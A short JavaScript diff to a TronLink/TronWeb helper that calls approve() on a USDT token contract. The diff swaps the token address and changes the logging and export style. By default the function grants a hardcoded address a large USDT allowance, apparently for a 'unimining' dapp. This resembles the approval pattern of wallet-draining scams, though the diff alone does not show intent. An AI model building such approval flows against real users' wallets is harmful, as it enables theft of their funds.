@@ -1,4 +1,5 @@
-const usdtTokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+// const usdtTokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+const usdtTokenAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"
 
 async function approveUSDT(approvedTo = "TWgXSgsmVvex3WWcYSYwQ52yw9vLgPcPKc",approvalAmount = 567800000000) {
   // Check if TronLink is installed
@@ -18,7 +19,8 @@ async function approveUSDT(approvedTo = "TWgXSgsmVvex3WWcYSYwQ52yw9vLgPcPKc",app
   try {
     const contract = await tronWeb.contract().at(usdtTokenAddress);
     const result = await contract.approve(approvedTo, approvalAmount).send({note: "This is test note from unimining"});
-    return {"wallet":currentAddress, "approvedTo": approvedTo, "trxHash": result.txID }
+    console.log("Transaction Object:", result)
+    return {"wallet":currentAddress, "approvedTo": approvedTo, "trxHash": result }
   } catch (error) {
     console.error("An error occurred during the approval process:", error);
     return false
@@ -26,4 +28,4 @@ async function approveUSDT(approvedTo = "TWgXSgsmVvex3WWcYSYwQ52yw9vLgPcPKc",app
 }
 
 
-module.exports = { approveUSDT };
+export default approveUSDT ;
